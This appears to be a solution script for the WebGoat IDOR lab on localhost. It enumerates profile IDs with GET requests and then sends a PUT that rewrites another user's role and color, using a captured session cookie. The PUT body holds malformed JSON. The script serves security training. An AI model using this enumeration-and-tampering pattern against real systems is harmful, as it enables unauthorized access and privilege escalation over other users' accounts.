import http.client


def GET_WebGoat_IDOR_profile(
        userId: int,
) -> http.client.HTTPResponse:
    method, path = 'GET', f'/WebGoat/IDOR/profile/{userId}'
    host, port = 'localhost', 8080
    headers = {
        'Host': 'localhost:8080',
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'keep-alive',
        'Referer': 'http://localhost:8080/WebGoat/start.mvc?username=testuser1',
        'Cookie': 'JSESSIONID=HyneSXzKOXvwy9PEdFBGwNzXdIVgNc5rctz2bJhi; hijack_cookie=8526824206571018870-1712961702743',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'content-length': '0',
    }
    body = ''
    connection = http.client.HTTPConnection(host, port)
    connection.request(method, path, body, headers)
    return connection.getresponse()

def PUT_WebGoat_IDOR_profile_userId(
        userId: int,
) -> http.client.HTTPResponse:
    method, path = 'PUT', f'/WebGoat/IDOR/profile/{userId}'
    host, port = 'localhost', 8080
    headers = {
        'Host': 'localhost:8080',
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'keep-alive',
        'Referer': 'http://localhost:8080/WebGoat/start.mvc?username=testuser1',
        'Cookie': 'JSESSIONID=HyneSXzKOXvwy9PEdFBGwNzXdIVgNc5rctz2bJhi; hijack_cookie=8526824206571018870-1712961702743',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'content-length': '63',
    }
    body = '{"role":1,"color":"red","userId":%s},"name":"Buffalo Bill"}' % userId
    connection = http.client.HTTPConnection(host, port)
    connection.request(method, path, body, headers)
    return connection.getresponse()


userId = 333

for i in range(2342300, 2342400):
    response = GET_WebGoat_IDOR_profile(i)
    if '"lessonCompleted" : false' not in response.read().decode('utf-8'):
        print(f'Success! i = {i}')
        userId = i
        break

resp = PUT_WebGoat_IDOR_profile_userId(userId)
print('Response:\n', resp.read().decode('utf-8'))